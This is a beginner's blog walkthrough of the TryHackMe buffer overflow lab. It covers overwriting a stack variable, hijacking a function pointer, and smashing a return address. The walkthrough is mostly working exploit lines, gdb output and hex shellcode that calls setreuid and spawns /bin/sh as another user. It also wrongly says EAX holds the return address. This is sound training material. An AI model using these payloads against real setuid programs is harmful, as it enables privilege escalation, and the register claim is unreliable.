# Buffer Overflow
[Tryhackme Buffer Overflows Room](https://tryhackme.com/room/bof1)


Hi !!! I'm a NOOB in buffer overflow and it took very long to come here. 

If any mistakes in this blog reach me at Twitter.
![twitter | 250](twitter.jpeg)

Are curious what Buffer Overflow is?

In [information security](https://en.wikipedia.org/wiki/Information_security "Information security") and [programming](https://en.wikipedia.org/wiki/Computer_programming "Computer programming"), a **buffer overflow**, or **buffer overrun**, is an [anomaly](https://en.wikipedia.org/wiki/Anomaly_in_software) where a [program](https://en.wikipedia.org/wiki/Computer_program), while writing [data](https://en.wikipedia.org/wiki/Data_(computing) "Data (computing)") to a [buffer](https://en.wikipedia.org/wiki/Data_buffer "Computer program"), overruns the buffer's boundary and [overwrites](https://en.wikipedia.org/wiki/Overwrite "Overwrite") adjacent [memory](https://en.wikipedia.org/wiki/Main_memory "Main memory") locations.
If you dont understand read again and again.

Three registers that should be known for understanding buffer overflow.

## 1. Special Purpose registers
1. **RBP** register is the base pointer of the function stack frame.
2. **RSP** register is the top pointer of the function stack frame.

## 2. General Purpose registers
3. **EAX** is the volatile register used to store the return address of the function

# Lets make our hands dirty

### Overwriting Variables
Program :

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

int main(int argc, char **argv)
{
  volatile int variable = 0;
  char buffer[14];

  gets(buffer);

  if(variable != 0) {
      printf("You have changed the value of the variable\n");
  } else {
      printf("Try again?\n");
  }
}
```

Usually stack is aligned to particular size boundaries viz 8bytes, 16bytes.
The buffer variable  is given 14 bytes size, lets find how many bytes we need to accomplish buffer overflow.

*FIRE UP GDB*
`gdb compiled_file` after which type `run` to start the program.
The program asks for input. By entering more than that it can hold the overflow happens. Start by entering more than 14 bytes. 

wohoo overflow happened at 15 bytes.

```
python -c "print('A'*15)" | ./int-overflow
You have changed the value of the variable
```

At 15 bytes buffer overflow occurs.
We 've successfully overwritten the interger variable.

**LETS DIG IN DEEPER**

### Overwriting function pointers

Program:

```
#include <stdlib.h>
#include <unistd.h>
#include <stdio.h>

void special()
{
    printf("this is the special function\n");
    printf("you did this, friend!\n");
}

void normal()
{
    printf("this is the normal function\n");
}

void other()
{
    printf("why is this here?");
}

int main(int argc, char **argv)
{
    volatile int (*new_ptr) () = normal;
    char buffer[14];
    gets(buffer);
    new_ptr();
}
```

Here need to overwrite the function pointer value.
Lets find the no.of. bytes needed to achieve overflow.

*Again fire up gdb with the compiled file and run*

```
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) Y
Starting program: /home/user1/overflow-2/func-pointer 
AAAAAAAAAAAAAAAAAAAA 

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? () <=======Function pointer overwritten
(gdb) run
The program being debugged has been started already.
Start it from the beginning? (y or n) Y
Starting program: /home/user1/overflow-2/func-pointer 
AAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x00000000004005da in main ()
```

At 20 bytes we can overwrite the function pointer as you can see in the output. If we enter more than 20 we can't overwrite it and it redirect to somewhere else.

*Use the following command to find the address of the function special*
```
objdump -d func-pointer | grep special
0000000000400567 <special>:
```
*Remember hat the architecture of this machine is little endian!*
So the address in hex form is `\x67\x05\x40\x00\x00\x00`
`20-6=14` ie:We need 16 junk bytes and the address of the special function
```
python -c "print('A'*14 + '\x67\x05\x40\x00\x00\x00')" | ./func-pointer 
this is the special function
you did this, friend!
```
Lets try with another function.
```
objdump -d func-pointer | grep other
0000000000400593 <other>:
```
And the address is `\x93\x05\x40\x00\x00\x00`
```
python -c "print('A'*14 + '\x93\x05\x40\x00\x00\x00')" | ./func-pointer 
why is this here?
```
Yo we did this!!

### Actual Buffer Overflow
Here is what the actual hero of the buffer overflow concept is digged. Lets take it out.
Guessed what!! A **shell**.

Program:
```
#include <stdio.h>
#include <stdlib.h>

void copy_arg(char *string)
{
    char buffer[140];
    strcpy(buffer, string);
    printf("%s\n", buffer);
    return 0;
}

int main(int argc, char **argv)
{
    printf("Here's a program that echo's out your input\n");
    copy_arg(argv[1]);
}
```

Here the size of the buffer is 140 bytes. *using gdb find the overflow point*

![](zNMC7in.png)


As the buffer grows up it overwrites the return address.
**We are going to point the return address back to the buffer**
Why?
The code for executing the shell is to be stored in buffer.
Overflow point for successfull return address overwrite is 158 as you can see in the below output.
```
(gdb) run $(python -c "print('A'*158)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*158)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000414141414141 in ?? () <==========return address over written
(gdb) run $(python -c "print('A'*159)")
The program being debugged has been started already.
Start it from the beginning? (y or n) y
Starting program: /home/user1/overflow-3/buffer-overflow $(python -c "print('A'*159)")
Here's a program that echo's out your input
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

Program received signal SIGSEGV, Segmentation fault.
0x0000000000400563 in copy_arg () <== redirected to other address
```

[I've used the shell code used here](https://l1ge.github.io/tryhackme_bof1/)
Shellcode in Assembly 
```
xor    rdi,rdi			
xor    rax,rax		
xor    rsi, rsi    		
mov    si, 1002      	    
mov    di, 1002			
mov    al,0x71			     
syscall					
xor    rdx,rdx
movabs rbx,0x68732f6e69622fff
shr    rbx,0x8
push   rbx
mov    rdi,rsp
xor    rax,rax
push   rax
push   rdi
mov    rsi,rsp
mov    al,0x3b
syscall
push   0x1
pop    rdi
push   0x3c
pop    rax
syscall
```

*Note: In the **fourth and fifth line** change the uid to 1002 for user2 and 1003 for user3 in upcoming task*
The hex code for the shell is 
```
\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05
```
Size: 62byes
For converting to assembly code to hex use [Online Assembly](https://defuse.ca/online-x86-assembler.htm)
Your payload should be like this
```
python -c “print (NOP \* no\_of\_nops + shellcode + random\_data \* no\_of\_random\_data + memory address)”
```

Let the random data be 10 bytes.
NOP = BufferOverflowPoint(155) -shell(62)- random data(10) - memory address(6)
NOP = 80
[NOP](https://en.wikipedia.org/wiki/NOP_(code)) is '\x90'
It does nothing. 

##### Finding the memory address of the buffer
*Do it in gdb*
```
(gdb) run $(python -c "print('\x90'*90 + '\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05' + 'B'*6)")
```
The program will crash
Now analyse the RSP register we talked in the started.
```
(gdb) x/100x $rsp-200
0x7fffffffe228: 0x00400450      0x00000000      0xffffe3e0      0x00007fff
0x7fffffffe238: 0x00400561      0x00000000      0xf7dce8c0      0x00007fff
0x7fffffffe248: 0xffffe650      0x00007fff      0x90909090      0x90909090
0x7fffffffe258: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe268: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe278: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe288: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe298: 0x90909090      0x90909090      0x90909090      0x90909090
0x7fffffffe2a8: 0x31489090      0xc03148ff      0x66f63148      0x6603eabe
0x7fffffffe2b8: 0xb003eabf      0x48050f71      0xbb48d231      0x69622fff
0x7fffffffe2c8: 0x68732f6e      0x08ebc148      0xe7894853      0x50c03148
0x7fffffffe2d8: 0xe6894857      0x050f3bb0      0x6a5f016a      0x050f583c
0x7fffffffe2e8: 0x42424242      0x00004242      0xffffe3e8      0x00007fff
0x7fffffffe2f8: 0x00000000      0x00000002      0x004005a0      0x00000000
0x7fffffffe308: 0xf7a4302a      0x00007fff      0x00000000      0x00000000
0x7fffffffe318: 0xffffe3e8      0x00007fff      0x00040000      0x00000002
0x7fffffffe328: 0x00400564      0x00000000      0x00000000      0x00000000
0x7fffffffe338: 0xd413b16a      0xfcc816b6      0x00400450      0x00000000
0x7fffffffe348: 0xffffe3e0      0x00007fff      0x00000000      0x00000000
0x7fffffffe358: 0x00000000      0x00000000      0x1973b16a      0x0337e9c9
0x7fffffffe368: 0x8097b16a      0x0337f97e      0x00000000      0x00000000
0x7fffffffe378: 0x00000000      0x00000000      0x00000000      0x00000000
0x7fffffffe388: 0xffffe400      0x00007fff      0xf7ffe130      0x00007fff
0x7fffffffe398: 0xf7de7656      0x00007fff      0x00000000      0x00000000
0x7fffffffe3a8: 0x00000000      0x00000000      0x00000000      0x00000000
```
The nop starts at '0x7fffffffe248' we can use this address or anywhere before the shell code starts.

*Outside of gdb*
```
./buffer-overflow $(python -c "print('\x90'*80 + '\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEA\x03\x66\xBF\xEA\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05' + 'A'*10 + '\x98\xe2\xff\xff\xff\x7f')")
Here's a program that echo's out your input
��������������������������������������������������������������������������������H1�H1�H1�f��f���qH1�H��/bin/shH�SH��H1�PWH���;j_j<XAAAAAAAAAA�����
sh-4.2$ whoami
user2
```

Hurray!!!!!

### Getting better
For the another task follow the above step again.

```
./buffer-overflow-2 $(python -c "print '\x90'*89+'\x48\x31\xFF\x48\x31\xC0\x48\x31\xF6\x66\xBE\xEB\x03\x66\xBF\xEB\x03\xB0\x71\x0F\x05\x48\x31\xD2\x48\xBB\xFF\x2F\x62\x69\x6E\x2F\x73\x68\x48\xC1\xEB\x08\x53\x48\x89\xE7\x48\x31\xC0\x50\x57\x48\x89\xE6\xB0\x3B\x0F\x05\x6A\x01\x5F\x6A\x3C\x58\x0F\x05' + 'A'*12 + '\x98\xe2\xff\xff\xff\x7f'")
new word is doggo�����������������������������������������������������������������������������������������H1�H1�H1�f��f���qH1�H��/bin/shH�SH��H1�PWH���;j_j<XAAAAAAAAAAAA�����
sh-4.2$ whoami
user3
```

References:
1. https://rayoflightz.github.io/linux/assembly/2019/03/26/Binary-patching-using-radare2.html
2. https://l1ge.github.io/tryhackme_bof1/
3. http://exploit.education/protostar/stack-zero/
4. http://exploit.education/protostar/

BYE!!!
